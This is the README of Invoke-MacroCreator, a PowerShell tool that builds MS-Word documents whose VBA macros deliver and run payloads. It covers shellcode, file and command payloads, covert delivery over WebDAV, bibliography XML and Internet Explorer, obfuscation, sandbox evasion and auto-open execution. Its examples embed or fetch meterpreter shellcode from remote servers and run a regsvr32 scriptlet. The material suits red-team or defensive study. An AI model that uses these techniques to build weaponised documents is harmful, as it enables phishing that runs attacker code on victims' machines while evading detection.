Macro Creator
============

Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

Invoke-MacroCreator is a powershell Cmdlet that allows for the creation of an MS-Word document embedding a VBA macro with various payload delivery and execution capabilities.

Description
-----------------
Basically the script supports three **types** of payload that you MUST specify using the `-t` argument:
  1. `shellcode`: any raw shellcode (*for instance created with msfvenom*). The shellcode is loaded into memory then loaded into the MS-Word process space and executed.
  2. `file`: any type of file (*executable, script, whatever...*). The file is first saved to a local temporary directory then called thanks to a command line specified as an argument.
  3. `command`: any command line to be executed

In either case, the payload itself must be a file (*even a `command` type payload should be in a file*). The file is specified using the `-i` argument.

Those payloads can be delivered through several **delivery** methods that you MUST specify using the `-d` argument:
  1. `body`: the payload is embedded into the body of the MS-Word document in an encoded form. This comes with a limit in terms of size of file that can be embedded.
  2. `comment`: the payload is embedded into the comment of the MS-Word document in a base64 encoded form. This technique is inspired by Invoke-Commentator.
  3. `webdav`: the payload is downloaded over a specific **WebDAV covert channel** (*PROPFIND only*) and requires a tool at the server side counter part: [@WebDavDelivery](https://github.com/Arno0x/WebDavDelivery). The process seen performing network traffic is 'svchost.exe'.
  4. `biblio`: aka "Bibliograpy sources". The payload is embedded in a bibliography sources XML file and then loaded over HTTP(S). The generated 'sources.xml' file must be hosted on a web server.	The process seen performing network traffic is 'word.exe'.
  5. `html` (*using IE*): the payload is embedded into a simple HTML file and then downloaded over HTTP(S) from an Internet Explorer COM object. The generated 'index.html' file must be hosted on a web server. The process seen performing network traffic is 'iexplorer.exe'

If the payload type is a `file`, use the `-c` option to define how the file should be called or executed.

If the delivery method is `webdav`, `biblio` or `html`, you can set the UNC/URL to use with the `-url` option. If you don't set this UNC/URL, the default parameters defined at the beginning of the script are used.

When a command is to be executed (*`file` or `cmd` payload*), three different execution methods are available that can be choosen using the `-m` switch.
	
[*Optionnal*] Using the optionnal `-o` switch, some level of obfuscation is applied on parts of the macro. Obfuscation is applied on:
  1. Variable names (in the template files, all variable surrounded by '_'. ex: `_varName_`)
  2. Function names (in the template files, all functions surrounded by '#'. ex: `#FunctionName#`)
  3. All string parameters (in the template files, all strings surrounded by '-'. ex: `-"any string"-`)
	
[*Optionnal*] Using the optionnal `-e` switch, some sandbox evasion technique can also be included. If a sandbox is being detected, the payload is not executed and the macro stops.

[*Optionnal*] Using the optionnal `-a` switch, auto open functions are added so that the macro is executed automatically when the document is opened. This is what you want for an "effective" attack, but probably not for testing/debugging purposes.


Dependencies
-----------------
Invoke-MacroCreator requires a proper installation of Microsoft Word.


Examples
-----------------
Here are some sample examples:
  
Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:
`C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body`
  
Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:
`C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o`
  
Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:
`C:\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e`
  
Executable delivered over WebDAV covert channel, using default UNC, no obfuscation, with sandbox evasion, using execution method 3:
`C:\PS> Invoke-MacroCreator -i badass.exe -p file -t webdav -c 'badass.exe' -e -m 3`
  
Command line embedded in the body of the MS-Word document, with obfuscation, no sandbox evasion, using execution method 1:
`C:\PS> Invoke-MacroCreator -i my_cmd.bat -p cmd -t body -o -m 1`
  
Shellcode embedded in a comment of the MS-Word document, no obfuscation, no sandbox evasion, adding auto-open functions:
`C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d comment -a`
